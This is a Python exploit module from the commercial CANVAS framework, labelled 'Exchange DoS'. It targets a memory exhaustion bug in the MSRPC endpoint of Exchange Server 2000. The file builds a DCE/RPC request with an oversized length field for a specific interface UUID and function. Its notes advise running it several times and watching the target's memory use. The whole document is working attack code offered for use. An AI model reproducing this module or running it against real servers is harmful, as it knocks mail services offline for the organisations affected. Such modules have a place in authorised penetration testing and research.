#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2006
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from libs.dcemarshall import *
from msrpcexploit import msrpcexploit

# GUI info
NAME                           = "Exchange DoS"
DESCRIPTION                    = "An obvious memory exaustion bug in Exchange Server 2000's MSRPC endpoint"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Microsoft"
DOCUMENTATION["Date public"]   = "10/1/2006"
DOCUMENTATION["Date partners"] = "9/28/2006"
DOCUMENTATION["CVE Name"]      = "Unknown"
DOCUMENTATION["CVE Url"]       = "Unknown"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["References"]    = ""
DOCUMENTATION["Notes"]= """
Very simple memory exhaustion bug tested against Exchange Server 2000 (may affect others).
Like all memory exhaustion bugs, you may have to run this several times. Try popping up
Task Manager and watching memory use while this is running.
"""

VERSION="0.1"
PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

CHANGELOG="""

"""

NOTES="""
        
"""

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name                = NAME        
        self.version             = 0
        self.badstring           = "\x00\\/.:$"
        self.UUID                = u"a4f1db00-ca47-1067-b31e-00dd010662da"
        self.uuidversion         = u"1.0"
        self.targetfunction      = 5
        self.autoversion         = 1
        self.version             = 1
        self.sleeptime           = 1
        self.buildConnectionList = self.buildTCPConnectionList
        self.run                 = self.run_exhaust_memory
        self.needsNoShellcode    = 1
   
    def ex_05(self,marshaller):
        """
        Obvious memory exhaustion bug...
        long  Function_05( [in]  [string] char *  element_78,
        [size_is(element_80)] [out]  char  element_79,
        [in]  long  element_80
        );
        """
        myspike_data=[]
        #element_78
        myspike_data.append(char_t("Hello",[],marshaller).marshall())
        #element_80
        myspike_data.append(dceint(self.exhaustsize,[],marshaller).marshall())
        return "".join(myspike_data)

    def buildDcePacket(self):
        """Builds the MSRPC packet """
        pkt=""
        marshaller=dcemarshaller()
        pkt=self.ex_05(marshaller)
        return pkt
    
    def testOS(self):
        "stub that always sets the version to 1"
        self.version=1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0, 1, None] and hasattr(ret, 'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print "Weird return value: %s"%ret
